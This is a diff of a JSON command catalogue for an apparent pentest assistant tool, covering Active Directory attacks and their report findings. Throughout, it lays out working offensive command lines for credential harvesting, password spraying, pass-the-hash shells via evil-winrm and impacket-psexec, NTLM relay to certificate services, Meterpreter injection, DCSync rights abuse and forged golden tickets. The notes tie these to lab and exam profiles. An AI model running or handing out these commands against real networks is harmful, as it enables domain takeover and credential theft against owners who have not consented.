@@ -316,7 +316,7 @@
           "tool": "windapsearch",
           "run": "windapsearch.py -d {{domain}} --dc-ip {{target}} --custom 'objectClass=*'",
           "web": "windapsearch.py -d {{domain}} --dc-ip {{target}} --custom 'objectClass=*' | tee {{scandir}}/ad-objects.txt",
-          "web_note": "Dumps every object, often far too many lines to paste. It writes to scans/ad-objects.txt (shown); attach that file in Evidence. For the full graph, SharpHound \u2192 the Domain tab is the heavier tool.",
+          "web_note": "Dumps every object, often far too many lines to paste. It writes to scans/ad-objects.txt (shown); attach that file in Evidence. For the full graph, SharpHound → the Domain tab is the heavier tool.",
           "note": "Dump every single object, OUs, groups, computers, service accounts. Service-account names (svc-*) are AS-REP roasting candidates, and Exchange security groups showing up in the results indicate Exchange is deployed (see writedacl-dcsync)."
         },
         {
@@ -365,7 +365,7 @@
         {
           "tool": "nxc",
           "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M get-desc-users",
-          "note": "PREFERRED: pull every user's description field \u2014 admins leave 'Default pwd: ...' and service-account passwords here more often than they should. Swap -u/-p for -u '' -p '' when an anonymous bind is open."
+          "note": "PREFERRED: pull every user's description field — admins leave 'Default pwd: ...' and service-account passwords here more often than they should. Swap -u/-p for -u '' -p '' when an anonymous bind is open."
         },
         {
           "tool": "nxc",
@@ -752,6 +752,9 @@
       ],
       "priority": 68,
       "phase": "loot",
+      "deprioritize_when": [
+        "loot.ntds"
+      ],
       "proves": "surfaces the files from a share spider whose names match credential-material hints, the candidate secrets to pull",
       "does_not_prove": "a validated credential; a matched filename is a lead to download and inspect, never a proven secret until its contents are read",
       "report": {
@@ -959,7 +962,7 @@
         {
           "tool": "nxc",
           "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --bloodhound -c All --dns-server {{target}}",
-          "note": "Gathers everything and outputs BloodHound-ready zips. Over a SOCKS tunnel, tack on --dns-tcp. Afterward, load the zips into BloodHound CE for the graph, or use Boxes \u2192 Ingest BloodHound here for an immediate findings summary."
+          "note": "Gathers everything and outputs BloodHound-ready zips. Over a SOCKS tunnel, tack on --dns-tcp. Afterward, load the zips into BloodHound CE for the graph, or use Boxes → Ingest BloodHound here for an immediate findings summary."
         },
         {
           "tool": "bloodhound-python",
@@ -1056,7 +1059,7 @@
         {
           "tool": "nxc",
           "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --admin-count",
-          "note": "LANE 1 (remote from Kali, no foothold) \u2014 start with nxc. Privileged accounts (adminCount=1), the high-value targets a path must end at. Pair with --kerberoasting/--asreproast: a roastable admin is a one-step path."
+          "note": "LANE 1 (remote from Kali, no foothold) — start with nxc. Privileged accounts (adminCount=1), the high-value targets a path must end at. Pair with --kerberoasting/--asreproast: a roastable admin is a one-step path."
         },
         {
           "tool": "nxc",
@@ -1188,7 +1191,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M backup_operator",
-          "note": "SeBackupPrivilege / Backup Operators path: with that right (no full admin needed) nxc remotely backs up the SAM+SYSTEM hives and, on a DC, NTDS.dit \u2014 every hash, no LSASS touch. The classic 'Backup Operator to Domain Admin' route."
+          "note": "SeBackupPrivilege / Backup Operators path: with that right (no full admin needed) nxc remotely backs up the SAM+SYSTEM hives and, on a DC, NTDS.dit — every hash, no LSASS touch. The classic 'Backup Operator to Domain Admin' route."
         },
         {
           "tool": "nxc",
@@ -1315,19 +1318,23 @@
       "commands": [
         {
           "tool": "nxc",
-          "run": "nxc smb {{target}} -u administrator -H {{nthash}}",
-          "note": "Confirm the dumped Administrator NT hash authenticates, expect (Pwn3d!). Select the Administrator credential (the one obol pulled from your NTDS dump) on the left so {{nthash}} fills; -H passes the hash, no password needed."
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}}",
+          "note": "Confirm you own the domain: pass the Administrator hash you just dumped from NTDS. obol fills the hash from the dump, so you do NOT swap your active credential. (Pwn3d!) proves Domain Admin."
         },
         {
-          "tool": "evil-winrm",
-          "run": "evil-winrm -i {{target}} -u administrator -H {{nthash}}",
-          "win": true,
-          "note": "Interactive shell as Administrator over WinRM, pure pass-the-hash, no plaintext. Paste the session banner back so obol marks the WinRM foothold; the 'Hunt for flags (Windows)' move then reads the proof files your lab/exam profile grades on. If 5985/WinRM is closed, use the psexec/wmiexec variants below."
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'whoami'",
+          "note": "Run a command as Administrator over SMB with the dumped hash (no shell, no evil-winrm needed)."
         },
         {
           "tool": "impacket-psexec",
-          "run": "impacket-psexec -hashes ':{{nthash}}' administrator@{{target}}",
-          "note": "SYSTEM shell via pass-the-hash when WinRM is closed. -hashes ':NT' (empty LM half). impacket-wmiexec with the same -hashes is the quieter, semi-interactive alternative."
+          "run": "impacket-psexec -hashes ':{{dahash}}' {{dauser}}@{{target}}",
+          "note": "Full SYSTEM shell via pass-the-hash (impacket, drops a service). Semi-interactive wmiexec is quieter: impacket-wmiexec -hashes :{{dahash}} {{dauser}}@{{target}}."
+        },
+        {
+          "tool": "evil-winrm",
+          "run": "evil-winrm -i {{target}} -u {{dauser}} -H {{dahash}}",
+          "note": "Interactive PowerShell via WinRM. If evil-winrm fails the instant it connects with `Net::NTLM::Client::SessionCrypto::CLIENT_TO_SERVER_SEALING`, that is the rubyntlm 0.6.7 bug on a fresh Kali (auth already succeeded, the first sealed message throws), not your hash: run `sudo gem install rubyntlm` to get 0.6.8 and re-run. The Loadout arsenal script applies this fix automatically."
         }
       ]
     },
@@ -1357,8 +1364,8 @@
         "foothold.windows"
       ],
       "priority": 92,
-      "proves": "produces a Windows foothold \u2014 authenticated code execution as the credentialed user",
-      "does_not_prove": "administrative access: a cracked service/user credential gets you a shell, not domain admin. Admin is established on its own (an admin whoami, or a dumped admin hash via DCSync \u2192 own-domain-pth), not assumed from a login.",
+      "proves": "produces a Windows foothold — authenticated code execution as the credentialed user",
+      "does_not_prove": "administrative access: a cracked service/user credential gets you a shell, not domain admin. Admin is established on its own (an admin whoami, or a dumped admin hash via DCSync → own-domain-pth), not assumed from a login.",
       "report": {
         "finding": "Lateral Movement via Exposed Credentials",
         "severity": "high"
@@ -1377,7 +1384,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -x '{{command}}'",
-          "note": "Execute any command on the host WITHOUT logging in, runs over WMI by default, dropping no service. The web crafter's 'run on host' menu fills {{command}} (whoami, systeminfo, net user\u2026) and you can edit it freely; string together whatever you need: pull files, add users, stage payloads."
+          "note": "Execute any command on the host WITHOUT logging in, runs over WMI by default, dropping no service. The web crafter's 'run on host' menu fills {{command}} (whoami, systeminfo, net user…) and you can edit it freely; string together whatever you need: pull files, add users, stage payloads."
         },
         {
           "tool": "nxc",
@@ -1387,7 +1394,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M met_inject -o LHOST={{lhost}} LPORT=4444",
-          "note": "Inject Meterpreter shellcode straight into memory over SMB (needs admin) \u2014 a staged foothold when you want a full MSF session rather than a one-shot command. Start the matching multi/handler first."
+          "note": "Inject Meterpreter shellcode straight into memory over SMB (needs admin) — a staged foothold when you want a full MSF session rather than a one-shot command. Start the matching multi/handler first."
         },
         {
           "tool": "nxc",
@@ -1407,7 +1414,7 @@
         {
           "tool": "evil-winrm",
           "run": "evil-winrm -i {{target}} -u {{user}} -p '{{password}}'",
-          "note": "The nicest interactive session when 5985/5986 is listening. Use -H to authenticate with a hash."
+          "note": "The nicest interactive session when 5985/5986 is listening. Use -H to authenticate with a hash. If evil-winrm fails the instant it connects with `Net::NTLM::Client::SessionCrypto::CLIENT_TO_SERVER_SEALING`, that is the rubyntlm 0.6.7 bug on a fresh Kali (auth already succeeded, the first sealed message throws), not your hash: run `sudo gem install rubyntlm` to get 0.6.8 and re-run. The Loadout arsenal script applies this fix automatically."
         },
         {
           "tool": "impacket-psexec",
@@ -1424,6 +1431,9 @@
           "run": "impacket-wmiexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
           "note": "Stealthier; it creates no service."
         }
+      ],
+      "deprioritize_when": [
+        "loot.ntds"
       ]
     },
     {
@@ -1464,7 +1474,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M mremoteng",
-          "note": "mRemoteNG stores connection passwords in confCons.xml, reversibly encrypted. nxc decrypts them remotely to cleartext \u2014 frequently domain-admin or service creds."
+          "note": "mRemoteNG stores connection passwords in confCons.xml, reversibly encrypted. nxc decrypts them remotely to cleartext — frequently domain-admin or service creds."
         },
         {
           "tool": "nxc",
@@ -1494,7 +1504,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M powershell_history",
-          "note": "Read every user's ConsoleHost_history.txt \u2014 operators routinely paste passwords/connection strings into PowerShell one-liners."
+          "note": "Read every user's ConsoleHost_history.txt — operators routinely paste passwords/connection strings into PowerShell one-liners."
         },
         {
           "tool": "nxc",
@@ -1568,7 +1578,7 @@
         {
           "tool": "ntlmrelayx",
           "run": "impacket-ntlmrelayx -t http://{{target}}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
-          "note": "ESC8: relay coerced DC$ auth (see coerce-auth) to the CA web-enrollment endpoint; the returned cert authenticates as the DC \u2192 DCSync."
+          "note": "ESC8: relay coerced DC$ auth (see coerce-auth) to the CA web-enrollment endpoint; the returned cert authenticates as the DC → DCSync."
         },
         {
           "tool": "certipy",
@@ -1579,7 +1589,7 @@
     },
     {
       "id": "cert-authenticate",
-      "title": "Authenticate with a Certificate (PKINIT \u2192 NT hash)",
+      "title": "Authenticate with a Certificate (PKINIT → NT hash)",
       "hypothesis": "A certificate issued for a principal (whether from ADCS ESC abuse or shadow credentials) authenticates as that principal via PKINIT. certipy auth returns a TGT and, through UnPAC-the-hash, the account's NT hash. This is the step that converts certificate material into a validated credential you can genuinely log in with.",
       "tool": "certipy",
       "tools": [
@@ -1604,7 +1614,7 @@
       "proves": "a validated credential (NT hash plus TGT) obtained from a certificate",
       "does_not_prove": "nothing past the principal the certificate belongs to",
       "report": {
-        "finding": "Certificate-based authentication (PKINIT \u2192 NT hash)",
+        "finding": "Certificate-based authentication (PKINIT → NT hash)",
         "severity": "high"
       },
       "refs": [
@@ -1856,7 +1866,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u '' -p '' -M zerologon",
-          "note": "PREFERRED, from Kali: nxc's zerologon module is a safe, unauthenticated detection \u2014 a VULNERABLE verdict mints the lead that lights the (destructive) zerologon-exploit. Alters nothing."
+          "note": "PREFERRED, from Kali: nxc's zerologon module is a safe, unauthenticated detection — a VULNERABLE verdict mints the lead that lights the (destructive) zerologon-exploit. Alters nothing."
         },
         {
           "tool": "zerologon-scan",
@@ -2082,7 +2092,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{subnet}} -u {{user}} -p '{{password}}' --local-auth",
-          "note": "When the credential is a LOCAL account (e.g. a dumped local Administrator hash), --local-auth validates it against each host's own SAM rather than the domain \u2014 the classic way one reused local-admin hash owns a whole fleet."
+          "note": "When the credential is a LOCAL account (e.g. a dumped local Administrator hash), --local-auth validates it against each host's own SAM rather than the domain — the classic way one reused local-admin hash owns a whole fleet."
         }
       ]
     },
@@ -2115,7 +2125,7 @@
       ],
       "priority": 55,
       "proves": "produces Kerberos tickets",
-      "does_not_prove": "context and enumeration only, no access, credential, or privilege \u2014 it's a hygiene/context reminder, not a frontier move, so it should never headline over actually using the credential you just earned",
+      "does_not_prove": "context and enumeration only, no access, credential, or privilege — it's a hygiene/context reminder, not a frontier move, so it should never headline over actually using the credential you just earned",
       "report": {
         "finding": "",
         "severity": "informational"
@@ -2154,7 +2164,7 @@
     },
     {
       "id": "kerberos-spn-fix",
-      "title": "Kerberos 'Principal Unknown' \u2014 Fix the Name/SPN",
+      "title": "Kerberos 'Principal Unknown' — Fix the Name/SPN",
       "tool": "sh",
       "tools": [
         "sh"
@@ -2171,7 +2181,7 @@
       "priority": 84,
       "hypothesis": "KDC_ERR_S/C_PRINCIPAL_UNKNOWN is a naming mistake, not a wall: Kerberos is case- and name-sensitive and will not take an IP. You pointed at an IP instead of the FQDN, used the wrong SPN, or mis-cased the realm. Use the full DC/service name (in /etc/hosts), the exact SPN, and an UPPERCASE realm, and the ticket issues.",
       "proves": "nothing attack-wise; it gets the KDC to recognise the principal so your Kerberos request works",
-      "does_not_prove": "that the account/SPN exists at all \u2014 if it truly does not, enumerate SPNs again",
+      "does_not_prove": "that the account/SPN exists at all — if it truly does not, enumerate SPNs again",
       "report": {
         "finding": "Kerberos principal/SPN naming corrected",
         "severity": "info"
@@ -2194,7 +2204,7 @@
     },
     {
       "id": "relay-target-signing",
-      "title": "Relay Blocked by SMB Signing \u2014 Pick a Signing-Off Target",
+      "title": "Relay Blocked by SMB Signing — Pick a Signing-Off Target",
       "tool": "nxc",
       "tools": [
         "nxc",
@@ -2212,7 +2222,7 @@
       "priority": 82,
       "hypothesis": "'Signing is required' means THIS relay target enforces SMB signing, so a relayed session is rejected - but signing is per-host, and in most domains plenty of hosts have it OFF. Enumerate which, and relay to one of those instead. The attack is not dead; you aimed it at a hardened box.",
       "proves": "nothing attack-wise; it redirects the relay to a host where it will actually land",
-      "does_not_prove": "that any host has signing off \u2014 if the whole domain enforces it, relay is genuinely out",
+      "does_not_prove": "that any host has signing off — if the whole domain enforces it, relay is genuinely out",
       "report": {
         "finding": "Relay target selection (SMB signing)",
         "severity": "info"
@@ -2224,7 +2234,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{subnet}} --gen-relay-list relay_targets.txt",
-          "note": "Sweep the subnet and write every host with SMB signing OFF to a file \u2014 those are the only valid relay targets."
+          "note": "Sweep the subnet and write every host with SMB signing OFF to a file — those are the only valid relay targets."
         },
         {
           "tool": "ntlmrelayx",
@@ -2235,7 +2245,7 @@
     },
     {
       "id": "responder-tune",
-      "title": "Responder Catching Nothing \u2014 Turn Its Servers On",
+      "title": "Responder Catching Nothing — Turn Its Servers On",
       "tool": "sh",
       "tools": [
         "sh"
@@ -2252,7 +2262,7 @@
       "priority": 60,
       "hypothesis": "Responder is poisoning but no hashes arrive because the rogue server that captures them is OFF - its SMB/HTTP is disabled in Responder.conf, or your own smbd/Apache is squatting the port. Turn the capture servers on (and free the ports) and the NetNTLM hashes start landing.",
       "proves": "nothing attack-wise; it makes Responder actually capture the auth it poisons",
-      "does_not_prove": "that any victim will authenticate \u2014 you still need traffic (a coerce, a logon, a mistyped share)",
+      "does_not_prove": "that any victim will authenticate — you still need traffic (a coerce, a logon, a mistyped share)",
       "report": {
         "finding": "Responder capture servers re-enabled",
         "severity": "info"
@@ -2275,7 +2285,7 @@
     },
     {
       "id": "fix-clock-skew",
-      "title": "Kerberos Clock Skew \u2014 Sync and Retry",
+      "title": "Kerberos Clock Skew — Sync and Retry",
       "hypothesis": "KRB_AP_ERR_SKEW / \"clock skew too great\" is not a broken credential - Kerberos simply refuses tickets when your clock and the DC's differ by more than ~5 minutes. Sync your box to the DC and the exact same command works. This one error strands more people in AD than any real defence does.",
       "tool": "ntpdate",
       "tools": [
@@ -2295,7 +2305,7 @@
       "priority": 88,
       "sequence": true,
       "proves": "a credential that authenticates over Kerberos once the clock is synced to the DC",
-      "does_not_prove": "a new credential \u2014 it unblocks the one you already have",
+      "does_not_prove": "a new credential — it unblocks the one you already have",
       "report": {
         "finding": "Kerberos clock skew resolved",
         "severity": "info"
@@ -2354,7 +2364,7 @@
         {
           "tool": "smbpasswd",
           "run": "smbpasswd -r {{target}} -U {{user}}",
-          "note": "Prompts for the old (expired) password, then your new one, straight over SMB \u2014 no shell required. The account now logs in with the new password."
+          "note": "Prompts for the old (expired) password, then your new one, straight over SMB — no shell required. The account now logs in with the new password."
         },
         {
           "tool": "impacket-changepasswd",
@@ -2370,7 +2380,7 @@
     },
     {
       "id": "ntlm-disabled-kerberos",
-      "title": "NTLM Disabled \u2014 Switch to Kerberos",
+      "title": "NTLM Disabled — Switch to Kerberos",
       "tool": "nxc",
       "tools": [
         "nxc",
@@ -2388,7 +2398,7 @@
       "priority": 86,
       "hypothesis": "STATUS_NOT_SUPPORTED on an SMB/LDAP login is not a bad credential - the DC has NTLM turned off and only speaks Kerberos. The exact same credential works the moment you add -k (and point at the DC by name, not IP). A hardened-auth lab banks on you reading this as 'login failed' and giving up.",
       "proves": "the credential authenticating over Kerberos once NTLM is taken out of the picture",
-      "does_not_prove": "a new credential \u2014 it is the one you already have, spoken the way the DC accepts",
+      "does_not_prove": "a new credential — it is the one you already have, spoken the way the DC accepts",
       "report": {
         "finding": "NTLM disabled; Kerberos used",
         "severity": "info"
@@ -2411,7 +2421,7 @@
     },
     {
       "id": "auth-account-blocked",
-      "title": "Account Locked or Restricted \u2014 What Now",
+      "title": "Account Locked or Restricted — What Now",
       "tool": "nxc",
       "tools": [
         "nxc"
@@ -2438,7 +2448,7 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{dc}} -u {{user}} -p {{password}} --pass-pol",
-          "note": "LOCKOUT: read the lockout policy (threshold + observation window). Stop spraying, wait out the window, and from now on spray ONE password across many users with a long --delay \u2014 never many passwords at one user."
+          "note": "LOCKOUT: read the lockout policy (threshold + observation window). Stop spraying, wait out the window, and from now on spray ONE password across many users with a long --delay — never many passwords at one user."
         },
         {
           "tool": "nxc",
@@ -2499,7 +2509,7 @@
         {
           "tool": "bloodyad",
           "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add groupMember \"{{group}}\" {{user}}",
-          "note": "The winning add: obol fills {{group}} with the highest-value group you can write to, a group whose membership hands you domain control (e.g. Exchange Windows Permissions \u2192 WriteDACL over the domain \u2192 DCSync), not merely the first one enumerated. Add yourself, then RE-AUTHENTICATE (new login / fresh ticket) so the membership takes effect, then run the `add dcsync` card below and secretsdump the Administrator hash. If bloodyAD reports the add succeeded but the next step is still denied, you have not re-authenticated yet."
+          "note": "The winning add: obol fills {{group}} with the highest-value group you can write to, a group whose membership hands you domain control (e.g. Exchange Windows Permissions → WriteDACL over the domain → DCSync), not merely the first one enumerated. Add yourself, then RE-AUTHENTICATE (new login / fresh ticket) so the membership takes effect, then run the `add dcsync` card below and secretsdump the Administrator hash. If bloodyAD reports the add succeeded but the next step is still denied, you have not re-authenticated yet."
         },
         {
           "tool": "bloodyad",
@@ -2698,7 +2708,7 @@
       ],
       "priority": 92,
       "proves": "produces authenticated access as the ticket's principal (a foothold) and lateral movement",
-      "does_not_prove": "administrative access: reusing a ticket authenticates you AS that principal \u2014 it only yields admin if the ticket belongs to an admin, which is established on its own, not assumed",
+      "does_not_prove": "administrative access: reusing a ticket authenticates you AS that principal — it only yields admin if the ticket belongs to an admin, which is established on its own, not assumed",
       "report": {
         "finding": "Kerberos Ticket Theft and Reuse",
         "severity": "critical"
@@ -2966,7 +2976,7 @@
       ],
       "priority": 92,
       "proves": "produces object-control paths (and, via a password reset, candidate credentials)",
-      "does_not_prove": "administrative access on its own \u2014 the control path still has to be cashed in (e.g. grant DCSync, then dump), which is why this hands off to DCSync rather than claiming admin directly",
+      "does_not_prove": "administrative access on its own — the control path still has to be cashed in (e.g. grant DCSync, then dump), which is why this hands off to DCSync rather than claiming admin directly",
       "report": {
         "finding": "Excessive AD Object Permissions (GenericAll/WriteDACL)",
         "severity": "high"
@@ -3004,7 +3014,7 @@
         {
           "tool": "powershell",
           "run": "Add-DomainObjectAcl -TargetIdentity '{{basedn}}' -PrincipalIdentity {{user}} -Rights DCSync -Verbose",
-          "note": "WriteDACL on the domain (e.g. via Exchange Windows Permissions) \u2192 grant your account DCSync, then run the `dcsync` card. NOTE: this is the MODERN PowerView cmdlet, the walkthrough's `Add-ObjectACL` is obsolete and errors with 'The term Add-ObjectACL is not recognized' on current PowerView. Prefer the remote bloodyAD path (`bloodyad-acl` card) to skip the PowerView upload + dot-source dance entirely."
+          "note": "WriteDACL on the domain (e.g. via Exchange Windows Permissions) → grant your account DCSync, then run the `dcsync` card. NOTE: this is the MODERN PowerView cmdlet, the walkthrough's `Add-ObjectACL` is obsolete and errors with 'The term Add-ObjectACL is not recognized' on current PowerView. Prefer the remote bloodyAD path (`bloodyad-acl` card) to skip the PowerView upload + dot-source dance entirely."
         }
       ]
     },
@@ -3426,7 +3436,7 @@
         {
           "tool": "impacket-ticketer",
           "run": "impacket-ticketer -nthash {{nthash}} -domain-sid {{domain_sid}} -domain {{domain}} -extra-sid {{forest_root_sid}}-519 administrator",
-          "note": "Forge a golden ticket for the child domain with the forest-root Enterprise Admins SID (-519) in SID history. Unfiltered intra-forest trusts honor it \u2192 forest root."
+          "note": "Forge a golden ticket for the child domain with the forest-root Enterprise Admins SID (-519) in SID history. Unfiltered intra-forest trusts honor it → forest root."
         },
         {
           "tool": "impacket-raiseChild",
